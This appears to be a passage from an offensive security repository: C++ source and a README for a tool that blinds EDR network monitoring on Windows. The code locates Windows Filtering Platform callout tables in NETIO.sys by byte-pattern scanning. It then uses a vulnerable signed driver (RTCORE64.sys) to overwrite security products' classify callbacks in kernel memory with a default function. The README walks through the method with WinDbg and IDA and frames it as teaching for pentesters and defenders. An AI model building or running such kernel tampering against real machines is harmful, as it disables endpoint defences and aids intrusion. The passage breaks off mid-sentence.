	//	fffff802`3e575e54 4053            push    rbx
	//	fffff802`3e575e56 4883ec20        sub     rsp, 20h
	//	fffff802`3e575e5a 488b05df970500  mov     rax, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)]
	//	fffff802`3e575e61 0f57c0          xorps   xmm0, xmm0
	//	fffff802`3e575e64 ba57667043      mov     edx, 43706657h
	//	fffff802`3e575e69 b900800100      mov     ecx, 18000h
	//	fffff802`3e575e6e 0f118098010000  movups  xmmword ptr[rax + 198h], xmm0
	//	fffff802`3e575e75 4c8b05c4970500  mov     r8, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)] ; search for this
	//	fffff802`3e575e7c 4981c0a0010000  add     r8, 1A0h ; as well search for this
	//  BYTE patterngWfpGlobal[] = { 0x4C, 0x8B, 0x05, 0x49, 0x81, 0xC0 }; change them in netUtil.h

	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patterngWfpGlobal[0]) && (((PBYTE)StartSearch)[1] == patterngWfpGlobal[1]) && (((PBYTE)StartSearch)[2] == patterngWfpGlobal[2]) && (((PBYTE)StartSearch)[7] == patterngWfpGlobal[3]) && (((PBYTE)StartSearch)[8] == patterngWfpGlobal[4]) && (((PBYTE)StartSearch)[9] == patterngWfpGlobal[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
			pgWfpGlobal = (LPVOID)((DWORD_PTR)StartSearch + 7 + distance);
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Get the offset to the pointer containing the Important CFG Function
	DWORD gWfpGlobal_offset = (DWORD)pgWfpGlobal - (DWORD)hNETIO;
	DWORD SECOND_OFFSET = *(PDWORD)((DWORD_PTR)StartSearch + 10);
	DWORD FIRST_OFFSET = SECOND_OFFSET - 0x08;

	printf("gWfpGlobal_offset: %llx\n", gWfpGlobal_offset);
	printf("First_OFFSET: %llx\n", FIRST_OFFSET);
	printf("SECOND_OFFSET: %llx\n", SECOND_OFFSET);

	// Search for the structure Size
	// Search First for Call InitDefaultCallout
	// fffff806`3bb15ebc e81f000000      call    NETIO!InitDefaultCallout(fffff806`3bb15ee0)
	// fffff806`3bb15ec1 488bd8          mov     rbx, rax
	// fffff806`3bb15ec4 4885db          test    rbx, rbx
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patterngInitDefaultCallout[0]) && (((PBYTE)StartSearch)[1] == patterngInitDefaultCallout[1]) && (((PBYTE)StartSearch)[2] == patterngInitDefaultCallout[2]) && (((PBYTE)StartSearch)[3] == patterngInitDefaultCallout[3]) && (((PBYTE)StartSearch)[4] == patterngInitDefaultCallout[4]) && (((PBYTE)StartSearch)[5] == patterngInitDefaultCallout[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch - 4);
			pInitDefaultCallout = (LPVOID)((DWORD_PTR)StartSearch + distance); 
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	DWORD InitDefaultCallout_OFFSET = (DWORD)pInitDefaultCallout - (DWORD)hNETIO;
	printf("InitDefaultCallout_OFFSET: %llx\n", InitDefaultCallout_OFFSET);

	// Search for the structure size inside the function
	// NETIO!InitDefaultCallout:
	// fffff802`4dde5ee0 4053            push    rbx
	// fffff802`4dde5ee2 4883ec20        sub     rsp, 20h
	// fffff802`4dde5ee6 4c8d056b9f0500  lea     r8, [NETIO!gFeCallout(fffff802`4de3fe58)]
	// fffff802`4dde5eed ba57667043      mov     edx, 43706657h
	// fffff802`4dde5ef2 b960000000      mov     ecx, 60h
	StartSearch = pInitDefaultCallout;
	BYTE STRUCTURESIZE;
	while (true) {
		if ((((PBYTE)StartSearch)[0] == patterngCalloutStructureSize[0])) {
			STRUCTURESIZE = *(PDWORD)((DWORD_PTR)StartSearch + 1); //Get the distance from the call instruction
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	printf("STRUCTURESIZE: %llx\n", STRUCTURESIZE);

	printf("this->lpnetioBase: %llx\n", this->lpnetioBase);

	LPVOID pWfpGlobal = NULL;
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpnetioBase + gWfpGlobal_offset,
		&pWfpGlobal,
		sizeof(pWfpGlobal)
	);
	if (!b) return FALSE;

	printf("pWfpGlobal: %llx\n", pWfpGlobal);

	DWORD numberofentries = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64) pWfpGlobal + FIRST_OFFSET,
		&numberofentries,
		sizeof(numberofentries)
	);
	if (!b) return FALSE;

	printf("numberofentries: %llx\n", numberofentries);

	LPVOID pentries = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64) pWfpGlobal + SECOND_OFFSET,
		&pentries,
		sizeof(pentries)
	);
	if (!b) return FALSE;

	printf("pentries: %llx\n", pentries);

	if (REMOVE == TRUE) {
		// FIND FeDefaultClassifyCallback
		StartSearch = GetProcAddress(hNETIO, "FeGetWfpGlobalPtr");
		EndSearch = GetProcAddress(hNETIO, "KfdDeRefCallout");

		printf("StartSearch %llx\n", StartSearch);
		// fffff800`82f75f21 488d0578950000  lea     rax, [NETIO!FeDefaultClassifyCallback(fffff800`82f7f4a0)]
		// fffff800`82f75f28 c70104000000    mov     dword ptr[rcx], 4
		while (StartSearch <= EndSearch) {
			if ((((PBYTE)StartSearch)[0] == patterngFeDefaultClassifyCallback[0]) && (((PBYTE)StartSearch)[1] == patterngFeDefaultClassifyCallback[1]) && (((PBYTE)StartSearch)[2] == patterngFeDefaultClassifyCallback[2]) && (((PBYTE)StartSearch)[7] == patterngFeDefaultClassifyCallback[3]) && (((PBYTE)StartSearch)[8] == patterngFeDefaultClassifyCallback[4])) {
				distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
				pFeDefaultClassifyCallback = (LPVOID)((DWORD_PTR)StartSearch + 7 + distance);
				break;
			}

			StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
		}

		FeDefaultClassifyCallback_offset = (DWORD)pFeDefaultClassifyCallback - (DWORD)hNETIO;
		printf("FeDefaultClassifyCallback_offset %llx\n", FeDefaultClassifyCallback_offset);
	}

	for (DWORD i = 0x00; i < numberofentries; ++i) {
		WFP_STRUCT* wfpstucture = new WFP_STRUCT();
		b = this->objMemHandler->VirtualRead(
			(DWORD64)pentries + STRUCTURESIZE * i,
			wfpstucture,
			sizeof(WFP_STRUCT)
		);
		if (!b) return FALSE;

		if (wfpstucture->secondDword == 0x01) {
			printf("-------------------------------------------------------------------------\n");
			printf("Entry Number: %d, WFP stucture entry pointer: %llx\n", i, (DWORD64)pentries + STRUCTURESIZE * i);
			if (wfpstucture->classifyFn != 0) {
				printf("[+] classifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->classifyFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x10] = std::make_pair((DWORD64)wfpstucture->classifyFn, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64) pentries + STRUCTURESIZE * i + 0x10,
							(DWORD64) this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->classifyFn) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x10] = std::make_pair((DWORD64)wfpstucture->classifyFn, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);
						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x10,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
				}
			}
			if (wfpstucture->notifyFn != 0) {
				printf("[+] notifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->notifyFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						//printf("write 1\n");
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->notifyFn) {
						//printf("write 2\n");
					}
				}
			}
			if (wfpstucture->deleteFn != 0) {
				printf("[+] deleteFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->deleteFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						//printf("write 1\n");
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->deleteFn) {
						//printf("write 2\n");
					}
				}
			}
			if (wfpstucture->classifyFn2 != 0) {
				printf("[+] classifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->classifyFn2);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x28] = std::make_pair((DWORD64)wfpstucture->classifyFn2, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x28,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->classifyFn2) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x28] = std::make_pair((DWORD64)wfpstucture->classifyFn2, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x28,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
				}
			}
		}
	}
	printf("Patched %d callbacks\n", numPatched);
}

// Function to extract the driver name from a TCHAR* input and return it as wchar_t*
wchar_t* NetworkManager::ExtractDriverName(TCHAR* driverOutput) {
	// Find the start of the driver name (after the '[')
	TCHAR* start = _tcschr(driverOutput, _T('['));
	if (!start) return NULL;  // Return NULL if '[' is not found

	// Find the end of the driver name (space or '+')
	TCHAR* end = _tcschr(start, _T(' '));
	if (!end) return NULL;  // Return NULL if no space is found

	// Calculate the length of the driver name
	size_t length = end - start - 1;

	// Allocate memory for the wide-character (wchar_t*) driver name
	wchar_t* driverName = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
	if (!driverName) return NULL;  // Return NULL if memory allocation fails

	// Copy the driver name into the wchar_t buffer
#ifdef UNICODE
	if (wcsncpy_s(driverName, length + 1, start + 1, length) != 0) {
		free(driverName);
		return NULL;  // Return NULL if copying fails
	}
#else
	size_t convertedChars = 0;
	if (mbstowcs_s(&convertedChars, driverName, length + 1, start + 1, length) != 0) {
		free(driverName);
		return NULL;  // Return NULL if conversion fails
	}
#endif

	driverName[length] = L'\0';  // Null-terminate the string

	return driverName;
}

NetworkManager::~NetworkManager()
{
}

```

`NetworkKernelBypass/NetworkCallbackKernelBypass/netUtil.h`:

```h
#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <unordered_map>
#include "net.h"
#include "MemHandler.h"
#include <map>

#define UNISTR_OFFSET_LEN 0
#define UNISTR_OFFSET_BUF 8
//lkd > u netio!FeInitCalloutTable L9
//NETIO!FeInitCalloutTable:
//	fffff802`3e575e54 4053            push    rbx
//	fffff802`3e575e56 4883ec20        sub     rsp, 20h
//	fffff802`3e575e5a 488b05df970500  mov     rax, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)]
//	fffff802`3e575e61 0f57c0          xorps   xmm0, xmm0
//	fffff802`3e575e64 ba57667043      mov     edx, 43706657h
//	fffff802`3e575e69 b900800100      mov     ecx, 18000h
//	fffff802`3e575e6e 0f118098010000  movups  xmmword ptr[rax + 198h], xmm0
//	fffff802`3e575e75 4c8b05c4970500  mov     r8, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)] ; search for this
//	fffff802`3e575e7c 4981c0a0010000  add     r8, 1A0h ; as well search for this
const uint8_t patterngWfpGlobal[] = { 0x4C, 0x8B, 0x05, 0x49, 0x81, 0xC0 };

// Search for the structure Size
// Search First for Call InitDefaultCallout
// fffff806`3bb15ebc e81f000000      call    NETIO!InitDefaultCallout(fffff806`3bb15ee0)
// fffff806`3bb15ec1 488bd8          mov     rbx, rax
// fffff806`3bb15ec4 4885db          test    rbx, rbx
const uint8_t patterngInitDefaultCallout[] = { 0x48, 0x8B, 0xd8, 0x48, 0x85, 0xdb };

// Search for the structure size inside the function
// NETIO!InitDefaultCallout:
// fffff802`4dde5ee0 4053            push    rbx
// fffff802`4dde5ee2 4883ec20        sub     rsp, 20h
// fffff802`4dde5ee6 4c8d056b9f0500  lea     r8, [NETIO!gFeCallout(fffff802`4de3fe58)]
// fffff802`4dde5eed ba57667043      mov     edx, 43706657h
// fffff802`4dde5ef2 b960000000      mov     ecx, 60h
const uint8_t patterngCalloutStructureSize[] = { 0xb9 };

//lkd > u
//NETIO!InitDefaultCallout + 0x22:
//fffff801`63968166 7573            jne     NETIO!InitDefaultCallout + 0x97 (fffff801`639681db)
//fffff801`63968168 488b0de1860300  mov     rcx, qword ptr[NETIO!gFeCallout(fffff801`639a0850)]
//fffff801`6396816f 448d4060        lea     r8d, [rax + 60h]
//fffff801`63968173 33d2 xor edx, edx
//fffff801`63968175 e8c6cb0100      call    NETIO!_memset_spec_ermsb(fffff801`63984d40)
//fffff801`6396817a 488b0dcf860300  mov     rcx, qword ptr[NETIO!gFeCallout(fffff801`639a0850)]
//fffff801`63968181 488d0528ebfdff  lea     rax, [NETIO!FeDefaultClassifyCallback(fffff801`63946cb0)]
//fffff801`63968188 c70104000000    mov     dword ptr[rcx], 4

const uint8_t patterngFeDefaultClassifyCallback[] = { 0x48, 0x8d, 0x05, 0xc7, 0x01 };

class NetworkManager
{
public:
	NetworkManager(MemHandler* objMemHandler);
	~NetworkManager();
	PVOID lpNtosBase = { 0 };
	PVOID lpnetioBase = { 0 };
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchCallbackMap;
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchLinksMap;
	BOOL Restore();
	TCHAR* FindDriver(DWORD64 address);
	BOOL EnumerateNetworkFilters(BOOLEAN REMOVE = false, wchar_t* DriverName = NULL, DWORD64 ADDRESS = NULL);
	wchar_t* ExtractDriverName(TCHAR* driverOutput);

private:
	ULONG ulNumFrames;
	PVOID ResolveDriverBase(const wchar_t* strDriverName);
	MemHandler* objMemHandler;
};

```

`NetworkKernelBypass/NetworkCallbackKernelBypass/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by FileNetworkKernelBypass.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`NetworkKernelBypass/Readme.md`:

```md
# Network Callout Kernel Callbacks Bypass

## Warning

Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Prerequisistes

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge.

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

- For everyone to be able to learn how technically bypassing EDR (Network Callbacks) is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse.

## Attacker Abuse Cases

An attacker with administrative privileges may attempt to disable EDR or install a rootkit. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.

**NetworkCallbackKernelBypass project uses RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**

## Introduction to Windows Filtering Platform (WFP) Callout Drivers

EDR And AV solutions can as well set up callbacks for network interactions.

A callout driver implements one or more callouts. Callouts extend the capabilities of the Windows Filtering Platform by processing TCP/IP-based network data in ways that are beyond the scope of the simple filtering functionality. Callouts are typically used to do the following tasks:

- Deep Inspection
- Packet Modification
- Stream Modification
- Data Logging

Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/network/introduction-to-windows-filtering-platform-callout-drivers

## How does it work

Reference: https://codemachine.com/articles/find_wfp_callouts.html

The variable netio!gWfpGlobal is the starting point for most WFP data structures.

<pre>
0: kd> dp   netio!gWfpGlobal L1
fffff880`017536a0  fffffa80`03718000 ;pointer to the WFP global structure
</pre>

The number of callouts and the pointer the array of callout structures is stored in this global table. To find the offset of these fields we can use the following technique

<pre>
lkd> u NETIO!FeInitCalloutTable L10
NETIO!FeInitCalloutTable:
fffff806`26a980b0 4053            push    rbx
fffff806`26a980b2 4883ec20        sub     rsp,20h
fffff806`26a980b6 488b05c38a0300  mov     rax,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
fffff806`26a980bd 0f57c0          xorps   xmm0,xmm0
fffff806`26a980c0 ba57667043      mov     edx,43706657h
fffff806`26a980c5 b900800100      mov     ecx,18000h
<mark>fffff806`26a980ca 0f118098010000  movups  xmmword ptr [rax+198h],xmm0</mark>
fffff806`26a980d1 4c8b05a88a0300  mov     r8,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
<mark>fffff806`26a980d8 4981c0a0010000  add     r8,1A0h</mark>
fffff806`26a980df e81cbffbff      call    NETIO!WfpPoolAllocNonPaged (fffff806`26a54000)
fffff806`26a980e4 488bd8          mov     rbx,rax
fffff806`26a980e7 4885c0          test    rax,rax
fffff806`26a980ea 7534            jne     NETIO!FeInitCalloutTable+0x70 (fffff806`26a98120)
fffff806`26a980ec 488b0d8d8a0300  mov     rcx,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
fffff806`26a980f3 33d2            xor     edx,edx
fffff806`26a980f5 41b800800100    mov     r8d,18000h
</pre>

The find the number of built in layers and the pointer to the array of callout structures use the following technique:

<pre>
lkd> dqs NETIO!gWfpGlobal L1
fffff806`26ad0b80  ffff8088`65705010
lkd> dqs ffff8088`65705010 + 0x198 L1 ;number of entries
ffff8088`657051a8  00000000`00000400
lkd> dqs ffff8088`65705010 + 0x198 + 0x08 L1 ;Pointer to array of callout structures
ffff8088`657051b0  ffff8088`6819a000
</pre>

To find the size of each structure in this array we can use the following technique :

<pre>
lkd> u NETIO!InitDefaultCallout
NETIO!InitDefaultCallout:
fffff806`26a98144 4053            push    rbx
fffff806`26a98146 4883ec20        sub     rsp,20h
fffff806`26a9814a 4c8d05ff860300  lea     r8,[NETIO!gFeCallout (fffff806`26ad0850)]
fffff806`26a98151 ba57667043      mov     edx,43706657h
fffff806`26a98156 b960000000      mov     ecx,<mark>60h</mark>
fffff806`26a9815b e8a0befbff      call    NETIO!WfpPoolAllocNonPaged (fffff806`26a54000)
</pre>

To display all the elements of the array use the following command template :

r $t0=array_base;.for ( r $t1=0; @$t1 < array_count; r $t1=@$t1+1 ) {dps @$t0+2*@$ptrsize L2; r $t0=@$t0+structure_size;}

<pre>
0: kd> r $t0=ffff8088`6819a000;.for ( r $t1=0; @$t1 < 11e; r $t1=@$t1+1 ) {dps @$t0+2*@$ptrsize L2; r $t0=@$t0+40;}
fffffa80`0509c000  00000000`00000000
fffffa80`0509c008  00000000`00000000
fffffa80`0509c010  00000000`00000000
fffffa80`0509c018  00000000`00000000
fffffa80`0509c020  00000000`00000000
fffffa80`0509c028  00000000`00000000
fffffa80`0509c030  00000000`00000000
fffffa80`0509c038  00000000`00000000
fffffa80`0509c040  00000001`00000001
fffffa80`0509c048  00000000`00000000
fffffa80`0509c050  fffff880`019bf640 tcpip!IPSecInboundTransportFilterCalloutClassifyV4 ;WFP callouts
fffffa80`0509c058  fffff880`0180f2c0 tcpip!IPSecInboundTransportFilterCalloutNotifyV6+0x2 ;WFP callouts
fffffa80`0509c060  00000000`00000000
fffffa80`0509c068  00000000`00000000
fffffa80`0509c070  00000000`00000000
fffffa80`0509c078  00000000`00000000
fffffa80`0509c080  00000001`00000001
.
.
.
</pre>

I implemented this in the c code, to enumerate and output all callout functions.

## Composition of a network callout entry

Reference: https://github.com/0mWindyBug/WFPCalloutReserach

Based on the shared research, he find out the structure as follows of each entry

<pre>
  *(_DWORD *)CalloutEntryPtr = a1;
  *(_DWORD *)(CalloutEntryPtr + 4) = 1;
  if ( a1 == 3 )
    *(_QWORD *)(CalloutEntryPtr + 40) = ClassifyFunction;
  else
    *(_QWORD *)(CalloutEntryPtr + 16) = ClassifyFunction;
  *(_DWORD *)(CalloutEntryPtr + 48) = Flags;
  *(_BYTE *)(CalloutEntryPtr + 73) = a6;
  *(_QWORD *)(CalloutEntryPtr + 24) = NotifyFn;
  *(_QWORD *)(CalloutEntryPtr + 32) = FlowDeleteFn;
  *(_BYTE *)(CalloutEntryPtr + 72) = 0;
  *(_WORD *)(CalloutEntryPtr + 74) = 0;
  *(_DWORD *)(CalloutEntryPtr + 76) = 0;
</pre>

what we are interested in in our code is the following:

- Offset 0x04 from the start of each network callout entry is equal = 0x01 (we can use that in our c code to identify an entry)
- ClassifyFunction is the function that is actually doing all the verifications on the network packet => which we need to overwrite.

## EnumerateNetworkFilters function in the c code

The Driver responsible for setting and adding the network filters is `NETIO.SYS`

### Find NETIO!gWfpGlobal

First we need to do a Binary Search for the pointer of `NETIO!gWfpGlobal` inside the non exported function `netio!FeInitCalloutTable`.

<pre>
NETIO!FeInitCalloutTable:
fffff800`365780b0 4053            push    rbx
fffff800`365780b2 4883ec20        sub     rsp,20h
<mark>fffff800`365780b6 488b05c38a0300  mov     rax,qword ptr [NETIO!gWfpGlobal (fffff800`365b0b80)]</mark>
fffff800`365780bd 0f57c0          xorps   xmm0,xmm0
</pre>

`NETIO!FeInitCalloutTable` is not an exported function, so we cannot get the address of the function directly in our c code.
We need to start the binary search using a function that is exported and close to `NETIO!FeInitCalloutTable`.

the functions needs to be exported to be able to use `GetProcAddress` and `GetModuleHandle` on them and get the function address.

So To find the closest exported functions (start and end) to use in our code as a starting point for the binary search, we can use IDA.

First let's get the offset to the function from the nt base

<pre>
lkd> ? NETIO!FeInitCalloutTable - NETIO
Evaluate expression: 360624 = <mark>00000000`000580b0</mark>
</pre>

Then copy the `netio.sys` from `c:/windows/system32` to open it in IDA.

Then in IDA, first of all we rebase the IMAGEBASE to 0x00, to make the offsets we get in `windbg` from the nt base the actual address in IDA, without any additional calculations.

![IDA Rebase](./screenshots/RebaseProgram.png)

![IDA Rebase](./screenshots/Rebasev2.png)

Next we go the `Export table` in IDA and reorder all the functions by `address`.

Note: It will take some time for the addresses in the export table to be refreshed after the rebase.

And then you have to pick 2 functions where `000580b0` which is the address of `NETIO!FeInitCalloutTable` is between them.

As you can, from the screenshot `FeGetWfpGlobalPtr` and `KfdDeRefCallout` are the start and end functions that i will be using as `NETIO!FeInitCalloutTable` falls in between, so i can use `FeGetWfpGlobalPtr` as the start of the binary search.

![Export Table](./screenshots/ExportTable.png)


The global structure contains an offset to the network filters entries and another offset to the number of entires.

To extract these offsets as they may change between windows versions, we will extract them from the same function dynamically.

Finding one of them is enough, as they are only 8 bytes away from each others.

<pre>
lkd> u NETIO!FeInitCalloutTable L10
NETIO!FeInitCalloutTable:
fffff806`26a980b0 4053            push    rbx
fffff806`26a980b2 4883ec20        sub     rsp,20h
fffff806`26a980b6 488b05c38a0300  mov     rax,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
fffff806`26a980bd 0f57c0          xorps   xmm0,xmm0
fffff806`26a980c0 ba57667043      mov     edx,43706657h
fffff806`26a980c5 b900800100      mov     ecx,18000h
<mark>fffff806`26a980ca 0f118098010000  movups  xmmword ptr [rax+198h],xmm0</mark>
fffff806`26a980d1 <mark>4c8b05</mark>a88a0300  mov     r8,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
fffff806`26a980d8 <mark>4981c0</mark>a0010000  add     r8,1A0h
fffff806`26a980df e81cbffbff      call    NETIO!WfpPoolAllocNonPaged (fffff806`26a54000)
fffff806`26a980e4 488bd8          mov     rbx,rax
fffff806`26a980e7 4885c0          test    rax,rax
fffff806`26a980ea 7534            jne     NETIO!FeInitCalloutTable+0x70 (fffff806`26a98120)
fffff806`26a980ec 488b0d8d8a0300  mov     rcx,qword ptr [NETIO!gWfpGlobal (fffff806`26ad0b80)]
fffff806`26a980f3 33d2            xor     edx,edx
fffff806`26a980f5 41b800800100    mov     r8d,18000h
lkd> dqs NETIO!gWfpGlobal L1
fffff806`26ad0b80  ffff8088`65705010
lkd> dqs ffff8088`65705010 + 0x198 L1
ffff8088`657051a8  00000000`00000400
lkd> dqs ffff8088`65705010 + 0x198 + 0x08 L1
ffff8088`657051b0  ffff8088`6819a000
</pre>

<pre>
const uint8_t patterngWfpGlobal[] = { 0x4C, 0x8B, 0x05, 0x49, 0x81, 0xC0 };
</pre>

we need to pick bytes that are static and doesnt change between reboot. I highlighed what I will be searching for in my code (4c8b05 and 4981c0). and after finding the address in our code. we will get `fffff80626a980d1`.

After that we can calculate the global structure address and the offset in our code.

Next we will use another binary search to find the function address of `InitDefaultCallout`, because we will use to extract the callout structure size dynamicaly.

<pre>
lkd> u
NETIO!FeInitCalloutTable+0x4b:
fffff807`211e80fb 488b89a0010000  mov     rcx,qword ptr [rcx+1A0h]
fffff807`211e8102 e839cc0100      call    NETIO!_memset_spec_ermsb (fffff807`21204d40)
fffff807`211e8107 488b05728a0300  mov     rax,qword ptr [NETIO!gWfpGlobal (fffff807`21220b80)]
fffff807`211e810e c7809801000000040000 mov dword ptr [rax+198h],400h
<mark>fffff807`211e8118 e827000000      call    NETIO!InitDefaultCallout (fffff807`211e8144)</mark>
fffff807`211e811d <mark>488bd8</mark>          mov     rbx,rax
fffff807`211e8120 <mark>4885db</mark>          test    rbx,rbx
fffff807`211e8123 740f            je      NETIO!FeInitCalloutTable+0x84 (fffff807`211e8134)
</pre>

<pre>
const uint8_t patterngInitDefaultCallout[] = { 0x48, 0x8B, 0xd8, 0x48, 0x85, 0xdb };
</pre>

I will use the function `InitDefaultCallout` to get the structure size of each network callout entry (0x60 in our case) using binary search by searching for `b9` and reading the structure size after the address is found.

<pre>
lkd> u NETIO!InitDefaultCallout
NETIO!InitDefaultCallout:
fffff806`26a98144 4053            push    rbx
fffff806`26a98146 4883ec20        sub     rsp,20h
fffff806`26a9814a 4c8d05ff860300  lea     r8,[NETIO!gFeCallout (fffff806`26ad0850)]
fffff806`26a98151 ba57667043      mov     edx,43706657h
fffff806`26a98156 <mark>b9</mark>60000000      mov     ecx,60h
fffff806`26a9815b e8a0befbff      call    NETIO!WfpPoolAllocNonPaged (fffff806`26a54000)
</pre>

<pre>
const uint8_t patterngCalloutStructureSize[] = { 0xb9 };
</pre>

At this point we were able to extract
- Number of entries => NETIO!gWfpGlobal + 0x198
- Pointer to array of callout structure => NETIO!gWfpGlobal + 0x1A0
- callout structure size (0x60)

So now we need a way to identify the start of a callout and where the callback is inside the structure.

Previous Research on the subject [WFPResearch](https://github.com/0mWindyBug/WFPCalloutReserach) come up with the following:

<pre>
  *(_DWORD *)CalloutEntryPtr = a1;
  <mark>*(_DWORD *)(CalloutEntryPtr + 4) = 1;</mark>
  if ( a1 == 3 )
    <mark>*(_QWORD *)(CalloutEntryPtr + 40) = ClassifyFunction;</mark>
  else
    <mark>*(_QWORD *)(CalloutEntryPtr + 16) = ClassifyFunction;</mark>
  *(_DWORD *)(CalloutEntryPtr + 48) = Flags;
  *(_BYTE *)(CalloutEntryPtr + 73) = a6;
  *(_QWORD *)(CalloutEntryPtr + 24) = NotifyFn;
  *(_QWORD *)(CalloutEntryPtr + 32) = FlowDeleteFn;
  *(_BYTE *)(CalloutEntryPtr + 72) = 0;
  *(_WORD *)(CalloutEntryPtr + 74) = 0;
  *(_DWORD *)(CalloutEntryPtr + 76) = 0;
</pre>

so based on that, we can identify the start of a callout structure by checking if `CalloutEntryPtr + 0x04 = 0x01` in our code

And the callback function based on the research is the `ClassifyFunction`

So the tool, will loop through the entries, identify each callback entry and resolve the `ClassifyFunction` to what driver it corresponds to and output it to the console.

And you can pick a driver or an address and the tool will remove it and overwrite it with a default classify function `FeDefaultClassifyCallback` that only does basic verifications on the packet (Based on previous [research](https://github.com/0mWindyBug/WFPCalloutReserach))

`FeDefaultClassifyCallback` is used by `InitDefaultCallout`

<pre>
lkd> u
NETIO!InitDefaultCallout+0x22:
